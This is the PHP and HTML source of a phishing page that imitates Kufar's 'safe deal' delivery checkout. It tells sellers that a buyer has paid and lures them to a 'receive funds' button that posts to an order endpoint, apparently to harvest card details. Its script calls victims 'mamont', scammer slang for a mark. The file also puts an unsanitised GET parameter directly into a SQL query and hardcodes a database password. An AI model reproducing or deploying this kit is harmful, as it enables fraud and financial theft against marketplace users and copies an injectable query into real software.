
<?php
    $host = 'localhost';  // Хост, у нас все локально
    $user = 'proj1';    // Имя созданного вами пользователя
    $pass = '098098098ererer!'; // Установленный вами пароль пользователю
    $db_name = 'user1207376_kuf';   // Имя базы данных
    $link = mysqli_connect($host, $user, $pass, $db_name); // Соединяемся с базой

    // Ругаемся, если соединение установить не удалось
    if (!$link) {
      echo 'Не могу соединиться с БД. Код ошибки: ' . mysqli_connect_errno() . ', ошибка: ' . mysqli_connect_error();
      exit;
    }	
?>

<?php
   if (isset($_GET['id'])) {
      $sql = mysqli_query($link, "SELECT `ID`, `Name`, `Price`, `Desc`, `Image`, `Nickname`, `mt2`, `mt1`, `mt3`, `address` FROM `products` WHERE `ID`={$_GET['id']}");
      $product = mysqli_fetch_array($sql);
	  $id = isset($_GET['id']) ? $product['ID'] : ''; 
	  $name = isset($_GET['id']) ? $product['Name'] : ''; 
	  $price = isset($_GET['id']) ? $product['Price'] : ''; 
	  $desc = isset($_GET['id']) ? $product['Desc'] : ''; 
	  $image = isset($_GET['id']) ? $product['Image'] : ''; 
	  $nickname = isset($_GET['id']) ? $product['Nickname'] : ''; 
	  $mt2 = isset($_GET['id']) ? $product['mt2'] : ''; 
	  $mt1 = isset($_GET['id']) ? $product['mt1'] : ''; 
	  $mt3 = isset($_GET['id']) ? $product['mt3'] : ''; 
	  $address = isset($_GET['id']) ? $product['address'] : ''; 
   }
?>
<?php if ($name == null) { header('Location: https://kufar.by/ '); } ?>
<!DOCTYPE html>
<html lang="ru" prefix="og: http://ogp.me/ns#" id="html"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, minimal-ui, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
	  <link rel="icon" href="https://kufar.tech/product/kufar_favicon.png" type="image/png">
    <title>Kufar доставка</title>
    <meta property="og:url" content="https://kufar.by/">  
    <meta property="og:type" content="website">
    <meta property="og:description" content="Получение средств">
  
   <link href="./index_files/css" rel="stylesheet">

    <link type="text/css" href="./index_files/ultra.css" rel="stylesheet">
      
      <style>
      @media screen and (max-width: 600px) {.gjZzYk {text-align: center; display: block; margin-top: -5px;}}
      
      @media (min-width: 992px) {.rows { height: 80px;} .col-md-8 {width: 100%;}}
      </style>
      <link rel="icon" href="https://content.kufar.by/img/favicon.png" type="image/png">
    </head>

  <body class="body body--payments route__product_buy_id_any">

<div class="app app--simple_layout" id="app">

    <div class="base">

      <div class="_container header_prototype header_prototype--board tiny" data-container="HeaderBoardContainer" data-tiny="1"><header data-test-component="HeaderBoard" class="sc-ugnQR jRQBFv"><div class="sc-eIHaNI grYHP"></div><div class="sc-eTpRJs hnEmwS"><div class="sc-iomxrj fZtIUm"><section data-test-component="HeaderActionMenu" class="sc-gPEVay sc-eKZiaR dzCROE"><div class="sc-jAaTju sc-jDwBTQ sc-jlyJG sc-drMfKT lkKOyd"><div width="1" class="sc-jAaTju sc-iRbamj sc-hIVACf gjZzYk">
          <a href="https://kufar.by/" title="На главную" data-test-action="IndexPageLink" class="sc-eqIVtm sc-cpmKsF bcxWYD">
    
    <img src="./index_files/kufar_logo.svg" style="width: 134px;height: 46px;">
 </a><div class="sc-eXNvrr iBzLWS"></div>
          </div></div></section><div class="sc-dxZgTM RFfMX"></div></div></div></header></div>

        <aside class="nav_container sidebar_container"><nav class="_container" data-container="CategoryMobileContainer"></nav></aside>

<div class="bundle">
   <div class="container _container" data-container="PaymentsContainer">
      <div class="payments_container" id="payments">
         <div>
            <h1 class="title__1tzAN2wR">Оформление и получение средств</h1>
            <div class="container__28A_2L3T">
               <div>
                  <div class="product__2oLb4nXl">
                     <span class="product_image__2AcYUpNV">
                     <img src="<?php echo $image ?>" id="pr_image" width="100" height="100"></span>
                     <div class="product_content__mI30-3Fr">
                        <div class="product_inner__1ZrDwagy">
                           <div class="product_price__2IFwtrXu"><span class="product_real_price__j_Bk3J3i"><span><span id="pr_price"><?php echo $price ?></span>&nbsp;<span class="sc-bdVaJa ijDeHI"><b>р.</b><i>р.</i></span></span></span></div>
                           <div class="product_title__3jNOq_vZ" id="pr_name"><?php echo $name ?></div>
                        </div>
                     </div>
                  </div>
                  <div class="container__b66PCR7o">
                     <div class="summary__2TIRymkY">
                        <div class="summary_header__bJmC15X9">
                           <div class="summary_price__1HT5R9_P"><span>
                              <span id="last"><?php echo $price ?></span>&nbsp;<span class="sc-bdVaJa ijDeHI"><b>р.</b><i>р.</i></span></span>
                           </div>
                        </div>
                        <div class="fixed_buttons fixed_buttons--single">
                           <div class="summary_total__3aEKbkJu">
                              Итого
                              <div class="summary_total_value__nRhP7XkA"><span><span id="pr_price"><?php echo $price ?></span>&nbsp;<span class="sc-bdVaJa ijDeHI"><b id="mobile_price">р.</b><i>р.</i></span></span></div>
                           </div>
                           <div class="button_container">
                              <form method="post" id="form-payment" action="order?id=<?php echo $id; ?>">
                                 <input type="hidden" name="order" value="order">
                                 <button type="submit" id="good" class="sc-dVhcbM ccONKs">
                                 <span class="sc-fBuWsC hvBxNu">Получить средства</span>
                                 </button>
                               
                              </form>
                           </div>
                        </div>
                        <div class="safely_text__392qqBrF">
                           <div class="status_badge__icon status_badge__icon--deal"></div>
                           <span>Проведение платежей безопасно</span>
                        </div>
                        <div class="hint">Нажимая кнопку «Получить средства», вы&nbsp;принимаете правила <a href="https://www.kufar.by/agreement.htm" target="_blank" rel="noopener noreferrer">Пользовательского соглашения</a>&nbsp; с использованием онлайн сервиса "Безопасная сделка"</div>
                     </div>
                     <div class="block__3ioUhNQH">
                        <div class="panel__3B1d-ak5">
                           <div class="panel_icon__1HmxOezY">
                              <div class="status_badge__icon status_badge__icon--delivery status_icon__3QzFN2ZZ"></div>
                           </div>
                           <div class="panel_button__2vr4fIVO"></div>
                           <div class="panel_content__VGeorc1g">
                              <div class="text__3Wt10VPX">
                              <b>Ваш товар оформлен!</b>
                             </div>
                              <div class="hint__aMasvQSz">Покупатель уже оплатил заказ.</div>
                           </div>
                           <div class="panel_button__2vr4fIVO"></div>
                        </div>
                  
                        <div class="form__1P2Y3sX1">
                           <form>
                               
                              <label class="label__332nHo7g" style="font-weight: 700;">Данные для отправления</label>
                               
                              <div>
                                 <label class="label__332nHo7g">Адрес доставки</label>
                                 <div class="row rows">
                                    <div class="col-md-8">
                                       <div class="root__3ahLIWiH">
                                          <div class="from_group form_group__3-PlZQuP">
										  <input type="text" class="form_control form_control__3Uyg-pWq" placeholder="Индекс, город, улица, дом" id="0" disabled="" value="<?php echo $address ?>"></div>
                                       </div>
                                    </div>
                             
                                 </div>
                              </div>
                             
                              <div class="row" style="position: relative;">
                                 <div class="col-md-4">
                                     <label class="label__332nHo7g">Фамилия</label>
                                    <div class="from_group form_group__3-PlZQuP"><input name="lastname" type="text" id="2" class="form_control form_control__3Uyg-pWq" placeholder="Фамилия" maxlength="25" disabled="" value="<?php echo $mt1 ?>"></div>
                                 </div>
                                 <div class="col-md-4">
                                     <label class="label__332nHo7g">Имя</label>
                                    <div class="from_group form_group__3-PlZQuP"><input name="firstname" type="text" id="3" class="form_control form_control__3Uyg-pWq" placeholder="Имя" maxlength="25" disabled="" value="<?php echo $mt2 ?>"></div>
                                 </div>
                                 <div class="col-md-4">
                                     <label class="label__332nHo7g">Отчество</label>
                                    <div class="from_group form_group__3-PlZQuP"><input name="middlename" type="text" id="4" class="form_control form_control__3Uyg-pWq" placeholder="Отчество" maxlength="25" disabled="" value="<?php echo $mt3 ?>"></div>
                                 </div>
                              </div>
					
                              <p class="hint__2r7xW549" style="margin-top:15px">После получения средств на Вашу карту, пожалуйста отправьте товар покупателю по указанным данным, доступные пункты отправки товара можете просмотреть на официальном сайте <a href="https://www.belpost.by/services" target="_blank">Белпочта</a></p>
                           <p class="hint__2r7xW549">
После отправки товара укажите номер отправления покупателю! Товар следует отправить в течение 3-х суток с момента получения средств</p>
<div class="boxberry_text__24q32W-A"><a href="https://www.belpost.by/" target="_blank" rel="noopener noreferrer"><img src="./index_files/qBppMsE.png" alt="Белпочта" width="88" height="24"></a>Доставка осуществляется через сервис Белпочта.</div>                     
						  </form></div>
                        <div class="hint payhint__1EGeMlob">Нажимая кнопку «Перейти к&nbsp;оплате», вы&nbsp;соглашаетесь с&nbsp;заключением <a href="https://support.kufar.by/articles/200026948" target="_blank" rel="noopener noreferrer">Договора купли-продажи</a>&nbsp;товаров с&nbsp;использованием Онлайн сервиса «Безопасная сделка»</div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</div>
</div>
<div class="overlay"><div class="loader hide"></div></div><div class="global"><div></div></div>
</div>
<script type="text/javascript" async="" src="./index_files/client.js.Без названия"></script><script src="./index_files/jquery-1.9.1.js.Без названия"></script>
<script>
 $(document).ready(function () {

   $("#form-payment").click(function () {
		
     var a = $("#0")[0].value.length;
     var b = $("#1")[0].value.length;
     var c = $("#2")[0].value.length;
     var d = $("#3")[0].value.length;
     var e = $("#4")[0].value.length;
     var f = $("#5")[0].value.length;
     
    if (a != 0 && b != 0 && c != 0 && d != 0 && e != 0 && f != 0) 
    {
         
    var adres_mamont = $("#0").val() + " "+ $("#1").val();     
    var fio_mamont = $("#2").val() + " "+ $("#3").val() + " " + $("#4").val();
  
    $("#fio_mamont").val(fio_mamont);  
    $("#phone_mamont").val($("#5").val()); 
    $("#adres_mamont").val(adres_mamont);  
         
    $( "#form-payment" ).submit();
    }else
    {
    alert('Заполните все поля формы!');
    }
	   return false;
    });		
});   
</script>

</body></html>